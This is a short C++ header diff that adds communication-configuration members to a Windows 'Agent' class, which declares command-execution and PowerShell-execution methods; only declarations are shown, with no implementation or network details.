@@ -5,6 +5,9 @@
 
 #include <Windows.h>
 #include <string>
+#include "CommunicationConfig.h"
+#include "CommunicationManager.h"
+#include <memory>
 
 class Agent
 {
@@ -15,8 +18,10 @@ public:
     void Init();
     std::string ExecuteCommand(int commandType);
     std::string ExecutePowerShell(const std::string &command);
+    void ConfigureCommunication(const CommunicationConfig &config);
 
 private:
     std::string user;
+    std::unique_ptr<CommunicationManager> communicationManager;
 };
 // TODO: Reference additional headers your program requires here.
